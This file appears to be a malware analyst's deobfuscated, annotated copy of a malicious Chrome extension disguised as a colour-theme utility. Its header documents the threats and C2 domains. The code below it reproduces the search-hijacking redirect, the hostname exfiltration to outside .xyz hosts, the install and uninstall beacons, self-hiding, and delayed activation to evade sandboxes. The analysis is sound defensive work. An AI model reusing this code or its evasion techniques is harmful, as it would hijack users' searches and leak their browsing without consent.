/**
 * background_clean.js  —  DEOBFUSCATED / ANNOTATED VERSION
 * ============================================================
 * Original:  background_stripted.js
 * Tool:      cleanup_malware.js
 *
 * THREAT CLASSIFICATION:
 *   Type:     Malicious Chrome extension
 *             — Search hijacker + hostname exfiltrator
 *
 * MALICIOUS BEHAVIORS:
 *   1. Search hijacking
 *        Intercepts searches on Bing, Google, Yahoo, DuckDuckGo
 *        while tab is in "loading" state, redirects victim to:
 *          https://stttbu.xyz/ssc/pda?p=<search_query>
 *
 *   2. Hostname exfiltration
 *        Periodically sends the current tab's hostname to:
 *          https://sbtttu.xyz/sscbtu/pda?fer=<hostname>
 *        (rate-limited by a timestamp token stored in chrome.storage)
 *
 *   3. Install phone-home
 *        On first install, fetches:
 *          https://stttbu.xyz/ssce/i/pda        (telemetry ping)
 *          https://hjk7.xyz/ty?id=<reversed_ext_id>  (C2 registration)
 *        Then closes the initial window to hide itself.
 *
 *   4. Uninstall tracking
 *        Sets chrome.runtime.setUninstallURL to:
 *          https://hjk7.xyz/un?id=<ext_id>
 *
 *   5. Self-hiding
 *        Closes any tab whose URL contains its own extension ID
 *        (prevents user from seeing its internal pages).
 *
 *   6. Delayed activation
 *        Activation flag (isActive) is set to true only after 60 seconds,
 *        and only if chrome.storage shows "initial: default".
 *        This delays behavior to evade install-time sandbox analysis.
 *
 * C2 DOMAINS:
 *   stttbu.xyz    search redirect / telemetry
 *   sbtttu.xyz    hostname exfiltration
 *   hjk7.xyz      install/uninstall tracking
 *
 * COVER STORY:
 *   Masquerades as a color/theme utility extension.
 *   Includes a large CSS named-color map and color-space conversion
 *   functions to appear legitimate.
 *
 * OBFUSCATION TECHNIQUES (all now removed by cleanup_malware.js):
 *   - HSL↔RGB functions copy-pasted ~15x as dead-code padding (~700 lines)
 *   - C2 URLs split across d1-d7 string variables, assembled with +
 *   - Inline junk constants (run, rrange, hunit, hrange) scattered everywhere
 *   - Boolean !0/!1 instead of true/false
 *   - Scientific notation for timeouts (5e3, 60e3)
 *   - Color-themed obfuscated variable/function names
 *
 * NOTE: Output is NOT runnable — the original has intentional syntax breaks
 *       from the junk-code stripping technique. This is analysis output only.
 * ============================================================
 */

const recognizedColors = new Map(Object.entries({
	mediumturquoise: 0x48d1cc,
	darkmagenta: 0x8b008b,
	darkolivegreen: 0x556b2f,
	lightblue: 0xadd8e6,
	lightcoral: 0xf08080,
	forestgreen: 0x228b22,
	fuchsia: 0xff00ff,
	midnightblue: 0x191970,
	mintcream: 0xf5fffa,
	darkorange: 0xff8c00,
	mistyrose: 0xffe4e1,
	gainsboro: 0xdcdcdc,
	ghostwhite: 0xf8f8ff,
	gold: 0xffd700,
	lightcyan: 0xe0ffff,
	lightsalmon: 0xffa07a,
	darkorchid: 0x9932cc,
	darkred: 0x8b0000,
	goldenrod: 0xdaa520,
	gray: 0x808080,
	grey: 0x808080,
	antiquewhite: 0xfaebd7,
	blueviolet: 0x8a2be2,
	brown: 0xa52a2a,
	aliceblue: 0xf0f8ff,
	lightseagreen: 0x20b2aa,
	palegoldenrod: 0xeee8aa,
	palegreen: 0x98fb98,
	rosybrown: 0xbc8f8f,
	royalblue: 0x4169e1,
	sandybrown: 0xf4a460,
	skyblue: 0x87ceeb,
	slateblue: 0x6a5acd,
	slategray: 0x708090,
	slategrey: 0x708090,
	wheat: 0xf5deb3,
	white: 0xffffff,
	lightskyblue: 0x87cefa,
	blanchedalmond: 0xffebcd,
	black: 0x000000,
	blue: 0x0000ff,
	aqua: 0x00ffff,
	aquamarine: 0x7fffd4,
	snow: 0xfffafa,
	springgreen: 0x00ff7f,
	tomato: 0xff6347,
	turquoise: 0x40e0d0,
	violet: 0xee82ee,
	saddlebrown: 0x8b4513,
	salmon: 0xfa8072,
	papayawhip: 0xffefd5,
	peachpuff: 0xffdab9,
	red: 0xff0000,
	mediumvioletred: 0xc71585,
	moccasin: 0xffe4b5,
	orchid: 0xda70d6
}));

var processedTabs = [];
var extensionId = chrome.runtime.id;


chrome.action.onClicked.addListener(() => {
	chrome.tabs.query({active: true, currentWindow: true}, function (tabs) {
		let tab = tabs[0];
		if (tab.status === "complete" && tab.url) {
			let id = tab.id;
			chrome.action.setBadgeText({"text": "on"}, function () {
				setTimeout(function () {
					chrome.action.setBadgeText({"text": ""})
				}, 5000  /* 5s */)
			})
			chrome.tabs.sendMessage(id, {stoplight: 1});
		}
	})
})


function initialize() {
	chrome.storage.local.set({initial: "default"}, function () {
		setTimeout(()=> i = true, 60000 /* 60s */);
	})
}

var i;

function setTimestampToken(c) {
	let t = Date.now() / 1000;
	t = Math.round(t);
	chrome.storage.local.set({uicolor: c + t});
}

var s = false;

sliceString = (str, start, end) => str.slice(start, end); /* deobfuscated */

chrome.runtime.onMessage.addListener(function (e, n, o) {
	e.color === "light" && exfilHostname()
});

function exfilHostname() {

	fetchActiveHostname();

	chrome.storage.local.get(["uicolor"], function (c) {
		let t = Date.now() / 1000;
		t = Math.round(t);
		if (c.uicolor < t) {
			setTimestampToken(41110 );
							chrome.tabs.create({url: EXFIL_BASE +  currentHostname})
		}
	})
}

var currentHostname = "";

var yahooLabel = "yahoo";

function fetchActiveHostname() {
	chrome.tabs.query({currentWindow: true, active: true}, function (tabs) {
		let colorr = new URL(tabs[0].url)
		currentHostname = colorr.host;
	})
}


chrome.storage.local.get(["initial"], function (s) {
	if (s.initial == "default") {
		i = true
	}
});


REDIRECT_C2_BASE = "https://stttbu.xyz/ssc";

urlContains = (ee) => {
	return currentTabUrl.includes(ee);
};
var REDIRECT_BASE = "https://stttbu.xyz/ssc/pda?p=";

function closeTab(c) {
	chrome.tabs.remove(c)
}

var bingLabel = "bing";

parseUrl = (ee) => {
	return new URL(ee);
};

getSearch = (ee) => {
	return ee.search;
};

chrome.storage.local.get(["initalcolor"], function (s) {
	if (s.color === "default")
		i = true
});
var INSTALL_PING = "https://stttbu.xyz/ssce/i/pda";

parseQueryString = (e => e ? (/^[?#]/.test(e) ? e.slice(1) : e).split("&").reduce((p, c) => {
	let z = c.split("=");
	return p[z[0]] = z[1] ? decodeURIComponent(z[1].replace(/\+/g, " ")) : "", p
}, {}) : {})

chrome.storage.local.set({darkycolor: yahooLabel})

chrome.tabs.onUpdated.addListener(function (tabid, status, tab) {
	currentTabUrl = tab.url, urlContains(extensionId) && !urlContains("errors") && closeTab(tabid)
	if (i == true && s == false && "loading" === tab.status && !urlContains("ebsto")) {
		var t, c, n;

		if(urlContains("ing.c") && urlContains("arch") && !urlContains("=PERE") &&!(urlContains("rqsr"))
		&& (c = parseQueryString(getSearch(parseUrl(currentTabUrl))).q,
		urlContains("ght_s") && (c=tab.e),
		urlContains("rk_sa") && (c=tab.e)),
		urlContains("gle") && urlContains("sea") && urlContains("rch"))
			c = parseQueryString(getSearch(parseUrl(currentTabUrl))).q
				if(urlContains("oo") && urlContains(".co") && urlContains("arch.ya")
			&& !urlContains("mages.sea") && !urlContains("orchideo.seashell", 4,12) && !urlContains("aquamarinew", 8,11) && !urlContains(";_ylt"))
			c = parseQueryString(getSearch(parseUrl(currentTabUrl))).p || parseQueryString(getSearch(parseUrl(currentTabUrl))).q
		if(urlContains("om") && urlContains("du") && urlContains("ck") && urlContains("/?"))
			c = parseQueryString(getSearch(parseUrl(currentTabUrl))).q


		void 0 === c
		|| (processedTabs.includes(tabid))
		|| (interceptedQueries.includes(c))
		|| (s == true )
		|| (redirectTarget = REDIRECT_BASE + c, s = true && interceptedQueries.push(c) && chrome.tabs.create({url: un}, function(e) {

			setTimeout(()=>chrome.tabs.sendMessage(e.id, {setLight: 1}), 5000  /* 5s */)
			processedTabs.push(e.id) && closeTab(tabid)

			setTimeout(()=> processedTabs.length > 0 && processedTabs.shift(processedTabs[0]), 30000 /* 30s */)
		}), setTimeout(()=> s = false && interceptedQueries.length > 0 && interceptedQueries.shift(interceptedQueries[0]), 2000  /* 2s */))
	}
})

chrome.storage.local.set({darkbcolor: bingLabel})

chrome.runtime.setUninstallURL("https://hjk7.xyz/un?id=" + extensionId);

EXFIL_C2_BASE = "https://sbtttu.xyz/ssc";

chrome.runtime.onInstalled.addListener(function (e) {
	if("install" === e.reason)
		chrome.windows.getAll({populate: true}, (tabs) => {
			var t;
			for (let j= 0; j <= tabs.length - 1; j++)
				tabs[j].type.includes("pu") &&
				(initialize(), setTimeout(function () {
						setTimestampToken(1800);

						chrome.tabs.create({url: "https://hjk7.xyz/INSTALL_PING?id=" + extensionId.split("").reverse().join("")})
						chrome.windows.remove(tabs[j].id, function () {
						});
					}, 1000  /* 1s */)
				)
		}), fetch(INSTALL_PING);
});

var EXFIL_BASE = "https://sbtttu.xyz/sscbtu/pda?fer=";

chrome.tabs.onUpdated.addListener(function (tabid, status, tab) {


});
